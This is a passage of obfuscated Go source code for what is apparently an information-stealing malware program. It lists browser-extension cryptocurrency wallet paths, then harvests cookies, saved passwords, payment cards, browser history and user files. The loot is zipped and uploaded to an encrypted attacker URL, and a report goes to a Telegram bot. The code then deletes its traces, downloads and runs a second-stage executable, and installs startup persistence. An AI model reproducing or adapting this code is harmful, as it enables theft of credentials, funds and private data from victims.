		"SaturnWallet":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c68863de55ccbf011049e3c4f226b60135976f2dfa866b5be187cb31ebf6873a9295f73a308ea5fc6013dd8d06e892b2")),
		"HarmonyWallet":   filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481ce8d69df55d2b409154ce3c6e129ba053b907825fe8a6f53e283cb35eaf0873fd2e161f23870d4012490decf6c0f0cd0")),
		"PaliWallet":      filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c58461dc59c4be0c1e47e1c8e12db30f35906222f587665fed80c436e1fc9e33fa3ba9e2d9c31e23a8877cc17a8a2eb5")),
		"BoltX":           filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c98c63d159c3bb0b1b4aeac0fe20b4103f966e20fd856a59ee81c535e0f18d3ccad8ad5377f151510d4d4387f248b1e8")),
		"LiqualityWallet": filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c39361d542c9b909174ff9c1fe2ba20535976d20f38d6154ee8cc63ae5f2833319c4bc1fffff21949d2dca35726e9bb5")),
		"MaiarDeFiWallet": filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cc8d60d75ec0b006154aefcdf332b6103d92692ff3876355ea83cf39e8fd80303ad6ff5941969d54fa701cd4b7a9ff5e")),
		"TempleWallet":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c78c6cd05ec0b70c1344e0ccf932bf0e32976e2df8866f58e786ce3de5fa813e0bb63caac402a698cf4881fb730c41ec")),
		"Metamask_E":      filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cd8965db5ec0bd0e155ee5c1f92eb5083d926c2ffb8d6052ec85c231ebf68630df9e636f25f0e1523fa4bc7b020d9b22")),
		"Ronin_E":         filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c3896ad55dcab0021545eac1fe26bb03329b6e2bf5866a5ae586c435e5fd86364bc01d9daf202d2e8a0be11bb85eb64f")),
		"Yoroi_E":         filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c98868d353cbbe0b1f5eeac7f521a20c319b6527f68d6b56e083ca3af2f68d3f0cd46c091a2c15a4f2e0c0a578d16379")),
		"Authenticator_E": filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a61a8052c7e54b354ac2627659fa75f9cbec24ccdf4be0309bb2cb846bd157d2be0c1840e8cef325bf0239926025f9876947ed8dd83aedf2818eb5d47fee64e91faa46c04ec0416684")),
		"MetaMask_O":      filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cc8964d651c9b702164beacafe2db00c36966f26f3896b5aec81c534e0fc8d3452307fa878df0cd32298b99299ce6252")),
	}
	var finalUploadURL string
	decodedURL, err := base64.StdEncoding.DecodeString(config.UploadURL)
	if err != nil {
		return
	}
	decryptedURL, err := mthjurlhdjgzqjaxjbzbtoresngvatir(string(decodedURL), config.KeyDecrypt)
	if err != nil {
		return
	}
	if decodedFinalURL, err := base64.StdEncoding.DecodeString(decryptedURL); err == nil {
		finalUploadURL = string(decodedFinalURL)
	} else {
		finalUploadURL = decryptedURL
	}

	width, height, err := yqayrrwogqrhdyrezxzmizqxdcepfiku()
	if err != nil {
		log.Fatalf(Cijosgmviuhoepbatohaaytukfezbopl("a6120d789ca6e8fd26d6e5727006e6e73c040be389066dda59"), err)
	}

	message := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("aa304537cbefc29b3ffcc02d098fd3e469e20e061f8853aba850ec68218ceef019ba1cf0bc7e28048729763ad469baf0e024ddd551f231a2e788c674b074cbb0005a7ee8d6f978f2452bfb452ffe8e2567e890c065a2be9d57e8147dcdd2a1e6e0b7af03745fe795557eadd4f4b0480233026d1134a2a6298734a37dc5732935da61d66cf924f724e66ed6917723ee59ca5ada6415b6e900c7fc930eaa6ac4320b344c8f60caad032facde8ed8f07606c12a4e79381e50197b98ede8ff12d919551cbc86c7c7802b23522ac57f167ec195655311d897"), ipInfo["ip"].(string), ipInfo["country"].(string), hostname, pcType, arch, filePath, mainPath, allowedExtensions, foldersToSearch, files, mac, width, height, browserInfoStr)
	err = gvgkpxdiobvdipsvzpleylzniezgvjez(message, mainPath)
	if err != nil {
	} else {
	}
	inyizexmjelataluulqnxtyriuqnjrdn()
	aqjgdernyxyswtnenuzltkaebkodwziz(&browserPaths)
	count := mcpdvxagecmegmpgzuzurcdsxthgisse(browserPaths, mainPath)
	totalHistoryEntries := dwraztmzzddbsajluubeqskwpamqyfen(browserPaths, mainPath)
	totalCookies := mtucyzqazbjoxtjtjjqakixjnxvxcpbw(browserPaths, mainPath)
	totalPassword := awawpjkicefmzgjthatjrdlkzuyidhmc(browserPaths, mainPath)
	totalCardsFound := jbnekrkysmdedjzgsqdyfboegudmojxn(browserPaths, mainPath)
	totalFilesStolen := rqgoeloohwvycurhfbqqnhowljlzwcve(allowedExtensions, foldersToSearch, files, mainPath)
	check_telegram := Cijosgmviuhoepbatohaaytukfezbopl("56c839d8af0b49bca46006468ee9a099")
	check_wallet := Cijosgmviuhoepbatohaaytukfezbopl("56c839d8af0b49bca46006468ee9a099")
	if lafeykdwxhbyqrfikuielzzjufheriyb(mainPath) {
		check_telegram = Cijosgmviuhoepbatohaaytukfezbopl("9a050c87d64764b8cc14081b16d23e873eccc6")
	} else {
		check_telegram = Cijosgmviuhoepbatohaaytukfezbopl("8d0f7984f3433acd9c36aa9622e7b85c3f63")
	}
	result := rqwfxptonjbgpwldlmbbhqyvndmcxdfe(mainPath, walletPaths)
	if result == 1 {
		check_wallet = Cijosgmviuhoepbatohaaytukfezbopl("9a050c87d64764b8cc14081b16d23e873eccc6")
	} else {
		check_wallet = Cijosgmviuhoepbatohaaytukfezbopl("8d0f7984f3433acd9c36aa9622e7b85c3f63")
	}
	zipFilePath := filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a20913629cf3b8b039e5cb77019f999b48056c118bdca4ed9d98ca48210a19"))
	err = vyqmoebxvthosxevkoybhjnxayuxrgyf(mainPath, zipFilePath)
	if err != nil {
		return
	}
	data := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("98420a648bee97b134ab947b5e85cbe86ef96b3d049546a8ac1fb37024dabfd66b904c86ff2c684d85202744ec6bbcbab3729dc507ab61b7bcdb9070d540c6af47400cacc6b36ef003379e6327f293270dabc1cc7daeb98f28dd1777cbc9a8f1e2c8f5527513b8de5971ac8aa7b7042a5009235973b6bc659628a11482373f749e799526fa40c53ff3299f897275ba7fa56cf82838b7f95098adc550a863905031244a8577ddaf6b68fad5c0d04ce096cb585a68362f6c8dc79a1c48c4"), config.UserID, hostname, ipInfo["ip"].(string), pcType, totalPassword, totalCookies, count, totalCardsFound, totalFilesStolen, ipInfo["country"].(string), result, totalHistoryEntries)))
	encryptedData := itshogyyedwggahtntuzuawyazsscllf(data, config.KeyDecrypt)
	finalData := base64.StdEncoding.EncodeToString([]byte(encryptedData))
	fullUrl := finalUploadURL + "data=" + finalData + "&hash=" + config.KeyDecrypt
	sbepnwuncsfeqqfyupdmoxbjylmzzsil(zipFilePath, fullUrl)
	message2 := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("e990e09b7ebcf4ba6ec0fe6347d98bfa6cb477448064a876e901eb6c42c6e8943d8b459ef9212f008729763a65844b23a96cda886de830b3b3c98e62800e8dbe5b5a0bfaa861dd44c578cd6a70c7a32563f094cd65beb48c63895d62a8555b0d57d2eb152f70e69f5279aa8bb7e14b7a10573d5a33eef52c805173b133937b6ad065b020e34b911deb7fcd916b29fa6da73eea4ea44d02d282b3820ac72edb5678075f9e6d9eb17e28e191c7de8eeff638924e603e5834111db5e8e2ec41f9135243d8d0dda2fc3ba28d2a3f15edd001544500749ac43fb6167cf9c89996dd9fdcd9e5a1b1b6b5466c3bdd686f949567c267859efaf6e1e899132f6986955b7c6982c2ce7870c4cf04907532fbc0c8c37a8889fe0443c013424074716c037fc22bba3ba6ba315c3219f82dac46b475d46682945587a22f69509f5b53913c083db8f369c557a4598e383594fecc0ad909dcff3d96cff17150e5a9a357cb2b69b9563b5bea8c9b6c73c50daaf602be133e7d972b1ae1b1b69f08ce86a9da8e760508ae641e234a682709856121393bd4879d7a5c12aa835ecbd7c8d83247078ec254d3295f82e18d961af07a73da07ab518c77342c4f796753ca10a13fd2de006e02f3b4970e292025a27102a02e07a26f744b28b61d50f66a24f5c9501cc7cdfe7d656730224d90b19e640ec532a19730f9004fecf1b5474457d9ff867074e90a949761d800ef24655ad2bccaa84b2f5350224e790471089408ae5b2d101729679a6f3c156face62acce143904ddb657b7ff7019ec1df1f6ac8fb1ec4adab34b9a7677ed34f24b09d1abbf235c4e31d14a0f6438cc1ebb6a68bffbd5f9ae19623d06995e34a40466281b56582ec8cde10867d838938af6eef"), ipInfo["ip"].(string), ipInfo["country"].(string), hostname, pcType, arch, filePath, mainPath, allowedExtensions, foldersToSearch, files,
		count, totalHistoryEntries, totalCookies, totalPassword, totalCardsFound, totalFilesStolen, check_telegram, check_wallet,
	)
	kpsoqnqxaoelltlgvtfclvjqqezaptmd(config.TelegramToken, config.ChatID, message2)
	jhdozevoyydvxpzquporhgxteffmizsi(zipFilePath)
	btcnjemyhvyexgpowyuziojnrrjszzll(mainPath)

	if config.Delivery == "1" {
		Fanjhjvgwlhlwsgkmkczonclrgqtkozf()
	}
	if config.StubURL != "" {

		randomFileName, err := pkyvandyzmprmnhvrlbcxlnpxttleutf(10)
		if err != nil {
		}
		localPath := filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), randomFileName+".exe")

		err = Chvndzvvvesribbdchvxenxuuepsmqoa(config.StubURL, localPath)
		if err != nil {
		}
		err = Dcjfsfhusmaolsolqdhhwgmejnpanjaz(localPath)
		if err != nil {
		}
	}
	if config.Startup == "1" {
		destinationPath, err := ebkgkvbgsnngcfzknhtzjmqthvbmaifa()
		if err != nil {
			return
		}
		err = yabijnfpufhdoajacjzcgqghwvwwuooi(destinationPath)
		if err != nil {
			return
		}
	}

}
